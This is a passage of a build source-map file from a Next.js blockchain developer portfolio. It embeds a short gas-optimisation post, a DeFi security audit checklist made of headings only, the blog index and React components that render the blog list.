slots.\n\n### 3. Using Events Instead of Storage\n\nFor data that doesn't need to be accessed on-chain, use events.\n\n## Conclusion\n\nEfficient gas usage is essential for scalable blockchain applications.`,\n};\n"],"names":[],"mappings":";;;;AAEO,MAAM,4BAAkC;IAC7C,MAAM;IACN,OAAO;IACP,SACE;IACF,MAAM;IACN,UAAU;IACV,MAAM;QAAC;QAAY;QAAgB;KAAiB;IACpD,SAAS,CAAC;;;;;;;;;;;;;;;;;;;;;;sEAsB0D,CAAC;AACvE"}},
    {"offset": {"line": 2082, "column": 0}, "map": {"version":3,"sources":["file:///Users/satyabhaskar/Documents/ShriKrishna/blockchain-developer-portfolio11/lib/blogs/defi-security-checklist.ts"],"sourcesContent":["import { Blog } from \"../blog-data\";\n\nexport const defiSecurityChecklist: Blog = {\n  slug: \"defi-security-checklist\",\n  title: \"The Ultimate DeFi Security Audit Checklist\",\n  excerpt:\n    \"A comprehensive checklist covering all critical aspects of DeFi protocol security auditing.\",\n  date: \"2024-01-05\",\n  readTime: \"12 min read\",\n  tags: [\"DeFi\", \"Security\", \"Auditing\"],\n  content: `# The Ultimate DeFi Security Audit Checklist\n\n## Introduction\n\nDeFi protocols require rigorous security audits. This checklist covers essential areas to review.\n\n## Core Security Areas\n\n### 1. Access Control\n### 2. Oracle Manipulation\n### 3. Flash Loan Attacks\n### 4. Price Manipulation\n\n## Conclusion\n\nComprehensive security audits are vital for DeFi success.`,\n};\n"],"names":[],"mappings":";;;;AAEO,MAAM,wBAA8B;IACzC,MAAM;IACN,OAAO;IACP,SACE;IACF,MAAM;IACN,UAAU;IACV,MAAM;QAAC;QAAQ;QAAY;KAAW;IACtC,SAAS,CAAC;;;;;;;;;;;;;;;yDAe6C,CAAC;AAC1D"}},
    {"offset": {"line": 2118, "column": 0}, "map": {"version":3,"sources":["file:///Users/satyabhaskar/Documents/ShriKrishna/blockchain-developer-portfolio11/lib/blog-data.ts"],"sourcesContent":["// Blog post type definition\nexport interface Blog {\n  slug: string;\n  title: string;\n  excerpt: string;\n  date: string;\n  readTime: string;\n  tags: string[];\n  content: string;\n}\n\n// Import individual blog posts\nimport { EthernautCTFChallengesWriteups } from \"./blogs/Ethernaut_CTF_Writeups\";\nimport { gasOptimizationTechniques } from \"./blogs/gas-optimization-techniques\";\nimport { defiSecurityChecklist } from \"./blogs/defi-security-checklist\";\n\n// Export all blogs as an array\nexport const blogs: Blog[] = [\n  EthernautCTFChallengesWriteups,\n  gasOptimizationTechniques,\n  defiSecurityChecklist,\n];\n"],"names":[],"mappings":"AAAA,4BAA4B;;;;;AAW5B,+BAA+B;AAC/B;AACA;AACA;;;;AAGO,MAAM,QAAgB;IAC3B,8OAA8B;IAC9B,oPAAyB;IACzB,4OAAqB;CACtB"}},
    {"offset": {"line": 2139, "column": 0}, "map": {"version":3,"sources":["file:///Users/satyabhaskar/Documents/ShriKrishna/blockchain-developer-portfolio11/components/blog-list.tsx"],"sourcesContent":["import Link from \"next/link\"\nimport { Card, CardContent } from \"@/components/ui/card\"\nimport { Calendar, Clock } from \"lucide-react\"\nimport { blogs } from \"@/lib/blog-data\"\n\nexport function BlogList() {\n  return (\n    <div className=\"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6\">\n      {blogs.map((blog) => (\n        <Link key={blog.slug} href={`/blogs/${blog.slug}`}>\n          <Card className=\"h-full border-border/50 hover:border-primary/50 transition-all duration-300 hover:shadow-lg hover:-translate-y-1\">\n            <CardContent className=\"p-6\">\n              <div className=\"flex items-center gap-4 text-sm text-muted-foreground mb-4\">\n                <div className=\"flex items-center gap-1\">\n                  <Calendar className=\"h-4 w-4\" />\n                  <span>{blog.date}</span>\n                </div>\n                <div className=\"flex items-center gap-1\">\n                  <Clock className=\"h-4 w-4\" />\n                  <span>{blog.readTime}</span>\n                </div>\n              </div>\n              <h3 className=\"font-semibold text-xl mb-2 group-hover:text-primary transition-colors line-clamp-2\">\n                {blog.title}\n              </h3>\n              <p className=\"text-sm text-muted-foreground mb-4 line-clamp-3 leading-relaxed\">{blog.excerpt}</p>\n              <div className=\"flex flex-wrap gap-2\">\n                {blog.tags.map((tag) => (\n                  <span key={tag} className=\"px-2 py-1 rounded-md bg-primary/10 text-primary text-xs font-medium\">\n                    {tag}\n                  </span>\n                ))}\n              </div>\n            </CardContent>\n          </Card>\n        </Link>\n      ))}\n    </div>\n  )\n}\n"],"names":[],"mappings":";;;;;AAAA;AACA;AACA;AAAA;AACA;;;;;;AAEO,SAAS;IACd,qBACE,oTAAC;QAAI,WAAU;kBACZ,kMAAK,CAAC,GAAG,CAAC,CAAC,qBACV,oTAAC,gQAAI;gBAAiB,MAAM,CAAC,OAAO,EAAE,KAAK,IAAI,EAAE;0BAC/C,cAAA,oTAAC,uMAAI;oBAAC,WAAU;8BACd,cAAA,oTAAC,8MAAW;wBAAC,WAAU;;0CACrB,oTAAC;gCAAI,WAAU;;kDACb,oTAAC;wCAAI,WAAU;;0DACb,oTAAC,4RAAQ;gDAAC,WAAU;;;;;;0DACpB,oTAAC;0DAAM,KAAK,IAAI;;;;;;;;;;;;kDAElB,oTAAC;wCAAI,WAAU;;0DACb,oTAAC,mRAAK;gDAAC,WAAU;;;;;;0DACjB,oTAAC;0DAAM,KAAK,QAAQ;;;;;;;;;;;;;;;;;;0CAGxB,oTAAC;gCAAG,WAAU;0CACX,KAAK,KAAK;;;;;;0CAEb,oTAAC;gCAAE,WAAU;0CAAmE,KAAK,OAAO;;;;;;0CAC5F,oTAAC;gCAAI,WAAU;0CACZ,KAAK,IAAI,CAAC,GAAG,CAAC,CAAC,oBACd,oTAAC;wCAAe,WAAU;kDACvB;uCADQ;;;;;;;;;;;;;;;;;;;;;eAnBV,KAAK,IAAI;;;;;;;;;;AA8B5B"}},
    {"offset": {"line": 2276, "column": 0}, "map": {"version":3,"sources":["file:///Users/satyabhaskar/Documents/ShriKrishna/blockchain-developer-portfolio11/app/blogs/page.tsx"],"sourcesContent":["import { Header } from \"@/components/header\"\nimport { BlogList } from \"@/components/blog-list\"\n\nexport default function BlogsPage() {\n  return (\n    <div className=\"min-h-screen\">\n      <Header />\n      <main className=\"pt-24 pb-16 px-4 sm:px-6 lg:px-8\">\n        <div className=\"mx-auto max-w-5xl\">\n          <div className=\"mb-12\">\n            <h1 className=\"text-4xl md:text-5xl font-bold mb-4 bg-gradient-to-r from-cyan-400 to-purple-400 bg-clip-text text-transparent\">\n              Blog\n            </h1>\n            <p className=\"text-lg text-muted-foreground leading-relaxed\">\n              CTF Writeups and Deep Dives \n            </p>\n          </div>\n          <BlogList />\n        </div>\n      </main>\n    </div>\n  )\n}\n"],"names":[],"mappings":";;;;;AAAA;AACA;;;;AAEe,SAAS;IACtB,qBACE,oTAAC;QAAI,WAAU;;0BACb,oTAAC,qMAAM;;;;;0BACP,oTAAC;gBAAK,WAAU;0BACd,cAAA,oTAAC;oBAAI,WAAU;;sCACb,oTAAC;4BAAI,WAAU;;8CACb,oTAAC;oCAAG,WAAU;8CAAiH;;;;;;8CAG/H,oTAAC;oCAAE,WAAU;8CAAgD;;;;;;;;;;;;sCAI/D,oTAAC,6MAAQ;;;;;;;;;;;;;;;;;;;;;;AAKnB"}}]
}